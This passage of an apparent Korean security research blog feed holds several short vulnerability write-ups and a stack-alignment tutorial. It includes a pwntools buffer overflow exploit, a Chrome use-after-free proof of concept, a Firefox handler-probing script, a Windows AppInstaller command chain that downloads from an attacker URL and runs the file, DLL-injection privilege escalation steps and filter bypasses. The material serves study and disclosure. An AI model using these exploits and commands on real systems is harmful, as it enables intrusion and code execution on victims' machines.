간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달해서 프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>bof</tag>
      
      <tag>stack alignment</tag>
      
      <tag>rtl</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15680 : protocol handler infomation disclosure</title>
    <link href="/2020/12/05/fabu1ous/2020-12-05/"/>
    <url>/2020/12/05/fabu1ous/2020-12-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox에서 Protocol Handler를 이용한 Information Disclosure 취약점이 발견되었습니다. Protocol Handler는 응용 프로그램이 자신의 URI scheme를 등록할 수 있는 매커니즘으로 이를 통해 프로세스를 실행할 수 있습니다. 브라우저가 Protocol Handler URI를 사용해 프로세스를 실행하면 “웹사이트에서 이 애플리케이션을 열려고 합니다.”라는 알림이 뜹니다.  </p><p>Firefox가 이미지 태그의 소스를 렌더링 할 때, Protocol Handler의 존재 여부에 따라 렌더링 결과가 다릅니다. 해커는 이점을 악용해 원격으로 victim에 설치된 프로그램 리스트를 알 수 있습니다.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victim에 존재하는 Protocol Handler를 이미지 src에 넣으면 broken image에 대한 기본 설정에 따라 Element의 size가 24x24로 렌더링 됩니다.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하지않는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>반면, 존재하지 않는 Protocol Handler를 이미지 src에 넣으면 Element의 size는 0x0으로 설정됩니다.</p><p>따라서 해커는 간단한 JS script로 Element의 width를 검사해 Protocol Handler의 존재 여부를 확인하는 brute force 공격을 할 수 있습니다.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Chrome UAF in StopProfiler</title>
    <link href="/2020/12/04/l0ch/2020-12-04/"/>
    <url>/2020/12/04/l0ch/2020-12-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU 등의 리소스 사용량을 모니터링할 수 있는 <code>profiler</code> 객체에서 비동기 처리 키워드를 사용한 UAF 취약점이 발견되었습니다. </p><p>해당 취약점의 POC는 다음과 같습니다.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> 함수의 resolve는 사용자 정의 함수를 호출할 수 있습니다. </p><p>비동기 함수로 선언한 <code>main</code> 함수에서 <code>await</code> 키워드로 <code>performance.profile</code> 객체를 선언하고 <code>Object.prototype.__defineGetter__</code> 의 사용자 정의 함수와 main에서 <code>stop</code> 을 두 번 호출하게 되면  <code>CpuProfile</code> 객체가 삭제됩니다. 결과적으로 <code>CpuProfile</code> 에서 UAF 취약점을 트리거할 수 있습니다.</p><p>이는 간단하지만 높은 심각성의 UAF 취약점으로, Google은 <code>Profiler::stop</code> 에서 동기 스크립트 실행을 방지하도록 패치했습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>L0ch</tag>
      
      <tag>chrome</tag>
      
      <tag>javascript</tag>
      
      <tag>uaf</tag>
      
      <tag>asynchronous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</title>
    <link href="/2020/12/03/idioth/2020-12-03/"/>
    <url>/2020/12/03/idioth/2020-12-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p><p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>appinstaller</tag>
      
      <tag>arbitrary file download</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-14418 : madCodeHook library LPE</title>
    <link href="/2020/12/02/fabu1ous/2020-12-02/"/>
    <url>/2020/12/02/fabu1ous/2020-12-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHook은 다양한 API hooking 기능을 지원하는 third party 라이브러리입니다. madCodeHook라이브러리에 포함된 <code>ExprevDriver.sys</code>라는 드라이버는 유저 모드 프로세스에 <code>Protector32.dll</code> 혹은 <code>Protector64.dll</code>을 삽입해 그 프로세스를 보호 및 감시할 수 있습니다. DLL injection 공격을 방지하는 기능과 프로세스 모니터링 기능을 제공하므로 몇몇 보안 제품에서 madCodeHook 라이브러리를 사용합니다.</p><p>아이러니하게도 DLL injection을 방지하기 위해 사용되는 <code>ExprevDriver.sys</code> 드라이버에 path redirection을 이용한 toctou 취약점이 존재하고, 해커는 이를 악용해 DLL injection을 할 수 있습니다.</p><ol><li><p>실제  <code>Protector64.dll</code>이 존재하는 디렉터리를 가리키는 juction을 생성합니다.</p><pre><code class="hljs powershell">“mklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprev”</code></pre></li><li><p><code>ExprevDriver.sys</code>에 IOCTL을 넘겨줍니다.</p><pre><code class="hljs latex">“C:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dll”</code></pre><p>IOCTL을 사용해  <code>ExprevDriver.sys</code>가 삽입할 DLL의 경로와 대상 프로세스를 지정할 수 있습니다.  <code>ExprevDriver.sys</code>는 DLL을 삽입하기 전에 DLL의 전자서명을 검증하는 단계를 거치는데,  IOCTL로 설정된 경로를 사용합니다. Protector64.dll의 경로를 1번에서 만들어 둔 juction으로 설정해줍니다.</p></li><li><p>디렉터리 juction을 삭제하고 가짜 <code>Protector64.dll</code>을 생성합니다.</p><p>DLL의 전자서명 검증 이후 juction을 삭제하고 2번 단계에서 지정해준 경로에 <code>Protector64.dll</code>라는 이름의 악성 DLL을 생성합니다.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>lpe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
    <link href="/2020/12/01/l0ch/2020-12-01/"/>
    <url>/2020/12/01/l0ch/2020-12-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_Tar는 PHP에서 TAR 파일을 처리하는 데 사용하는 오픈소스 라이브러리입니다. 해당 라이브러리에서 phar unseirialization과 arbitrary file overwrite 두 가지 취약점이 발견되었습니다.</p><br>첫 번째 취약점(CVE-2020-28948)은 scheme 필터링 우회를 통한 unserialization 취약점입니다.<p>Archive_Tar에는 unserialization 공격을 방지하기 위해 다음과 같은 코드가 존재합니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;phar://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>그러나 <code>PHAR://malicious_file.phar</code> 과 같이 대문자로 작성하면 해당 코드를 우회해 unserialization을 통한 obejct injection이 가능합니다.<br><br></p><p>두 번째 취약점(CVE-2020-28949)은 Archive_Tar에서 stream wrapper를 체크하지 않아 발생하는 arbitrary file overwrite 취약점입니다. 이 취약점 또한 CVE-2020-28948과 같은 코드에서 발생한 취약점으로, <code>file://</code> scheme에 대한 검사를 하지 않아 해커가 임의 파일을 덮어쓸 수 있습니다. php가 루트 권한으로 실행되었다면 <code>/etc/passwd</code> 파일을 포함한 시스템 파일 또한 덮어쓸 수 있습니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>이 두 취약점은 문자열에 <code>phar://</code> 가 아닌 <code>://</code> 가 포함될 경우 이를 필터링하는 방식으로 패치되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>bypass</tag>
      
      <tag>unserialization</tag>
      
      <tag>arbitrary file overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8277: Node.js OOB Read를 통한 Denial of Service</title>
    <link href="/2020/11/30/idioth/2020-11-30/"/>
    <url>/2020/11/30/idioth/2020-11-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.js에서 OOB(Out of Bounds) Read를 통해 Denial of Service를 트리거할 수 있는 취약점이 발견되었습니다. 해당 취약점은 많은 양의 DNS record를 <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares 라이브러리</a>에서 TTL record를 parsing 할 때 배열 길이의 계산을 잘못하면서 일어나는 취약점입니다.</p><p>c-ares 라이브러리의 <code>ares_parse_aaaa_reply</code> 함수는 response를 포함하는 <code>char* abuffer</code>, response의 길이인 <code>alen</code>, DNS response가 반환될 구조체 포인터 <code>host</code>, TTL 배열인 <code>addrttls / naddrttls</code>를 인자로 갖습니다. <code>addrttls</code>는 반환된 TTL의 주소로 채워지는 배열이고, <code>naddrttls</code>는 반환할 TTL의 최대 값입니다. response의 reply 개수가 <code>addrttls</code> 배열보다 클 경우  <code>naddrttls</code>에서 확인 후 256개의 TTL만 처리되고 나머지 부분은 잘리게 됩니다. 하지만 취약점은 TTL의 개수에 대한 잘못된 처리가 아니라 response의 reply 개수를 잘못 계산하는 것에서 일어납니다.</p><ol><li>reply의 개수를 새서 <code>naddrs</code>에 저장</li><li>TTL 배열 작성(<code>naddrttls</code>에 의해 잘린 <code>addrttls</code>)</li><li><code>naddrttls</code> 재작성 - 실제 TTL 배열에 작성된 값보다 큰 지 확인하지 않고 <code>naddrs</code>를 집어넣음</li></ol><p>따라서 반환된 <code>naddrttls</code>가 작성된 reply의 TTL 개수보다 커지므로 OOB read가 가능하고 이를 악용하여 Denial of Service 공격을 트리거할 수 있습니다.</p><p>해당 취약점은 <code>naddrttls</code>에 <code>naddrs</code> 값을 넣을 때 <code>naddrs</code>의 값이 <code>naddrttls</code>보다 클 경우 <code>naddrttls</code> 값을 넣는 것으로 패치되었습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>dos</tag>
      
      <tag>node.js</tag>
      
      <tag>oob read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 2</title>
    <link href="/2020/11/29/l0ch/windows-patch-diffing-part2/"/>
    <url>/2020/11/29/l0ch/windows-patch-diffing-part2/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요 여러분! L0ch입니다. 지난 Windows Patch Diffing글의 분량 조절 실패로 파트 1에 이어 파트 2로 돌아왔습니다! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing 맛보기 Part 1</a></p><p>업데이트 패키지 추출도 했으니 이제 진짜 패치 diffing을 시작…하기 전에! 해야 할게 한 가지 더 남아있습니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png"></p><blockquote><p>아니 그럼 diffing은 대체 언제 함?</p></blockquote><p>윈도우에서 패치를 할 때 어떤 방식으로 하는지를 먼저 알아봐야 합니다. 그래야 diffing 할 버전 별 바이너리를 생성할 수 있어요 ㅎㅎ</p><h1 id="패치-파일-유형"><a href="#패치-파일-유형" class="headerlink" title="패치 파일 유형"></a>패치 파일 유형</h1><p>이전 글에서 추출한 null, forward, reverse differential에 대해 간단하게 살펴봤었죠. 이 diff 유형의 파일들은 diffing 할 버전별 바이너리를 생성하는 데 아래와 같은 역할을 합니다.</p><ul><li><p>Forward diff</p><ul><li>기본 바이너리 (.1)를 특정 패치 수준까지 가져옵니다.</li></ul></li><li><p>Reverse diff</p><ul><li>패치가 적용된 바이너리를 기본 바이너리 (.1)로 롤백합니다.</li></ul></li><li><p>NULL diff</p><ul><li><p>패치에서 새 파일이 추가될 경우 사용됩니다.</p></br></li></ul></li></ul><p>diff 파일을 이용한 Windows의 패치 과정입니다. </p><ol><li>기존 바이너리 버전에 맞는 reverse diff 파일로 델타 패치해 기본 버전으로 롤백</li><li>패치 패키지에서 추출한 forward diff 파일로 델타 패치</li></ol><ul><li><p>NULL diff일 경우 패치할 경로에 복사</p></br></li></ul><p>우리가 diffing 할 바이너리를 구하는 과정은 다음과 같습니다.</p><ol><li><code>C:\system32\WinSxS</code> 에서 diffing 할 바이너리를 찾습니다. WinSxS에는 diff 파일뿐만 아니라 해당 버전의 바이너리도 함께 들어있습니다.</li><li>해당 버전의 reverse diff로 델타 패치해 기본 버전 바이너리로 롤백합니다.</li><li>추출한 패치 파일에서 패치할 버전의 forward diff로 델타 패치를 합니다.</li><li>패치된 바이너리의 hash를 구하고 manifest hash와 비교해 정상적으로 패치되었는지 확인합니다.</li></ol><h1 id="패치-적용"><a href="#패치-적용" class="headerlink" title="패치 적용"></a>패치 적용</h1><p><code>ntoskrnl.exe</code> 의 버전 별 바이너리를 생성해서 diffing 해보도록 하겠습니다!</p><p>diffing 대상 선정은 취약점 정보와 해당 취약점의 패치 릴리즈 버전을 보고 판단하면 되겠습니다.</p><p>powershell에서 다음 명령어를 입력하면 WinSxS에 업데이트된 버전별 differential 파일들을 확인할 수 있습니다.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? &#123;$_.Name -eq &quot;ntoskrnl.exe&quot;&#125;</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png"></p><p>환경마다 누적된 업데이트가 달라서 결과는 다를 수 있습니다.  현재 제 윈도우 시스템의 <code>ntoskrnl.exe</code> 버전인 10.0.18362.1082를 기준으로 진행해 볼게요.</p><p>현재 ntoskrnl.exe 버전 - 10.0.18362.1082</p><p>추출한 ntoskrnl.exe 버전 - 10.0.18362.1016</p><p>1082 버전은 제 시스템에 이미 있으니 1016 버전을 델타 패치로 생성해보겠습니다!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff 패치에는 ms에서 지원하는 patch API인 <code>msdelta.dll</code> 를 사용합니다.</p><p>Vista 이상 Windows에서는 <code>msdelta.dll</code> 이 기본적으로 내장되어 있기 때문에 가져다가 쓰기만 하면 되죠 ㅎㅎ</p><p>아래는 파이썬을 사용해 작성한 msdelta 패치 스크립트입니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpcStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&#x27;u1&#x27;</span>,)_fields_ = [(<span class="hljs-string">&#x27;u1&#x27;</span>, U1),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t),(<span class="hljs-string">&#x27;Editable&#x27;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID),(<span 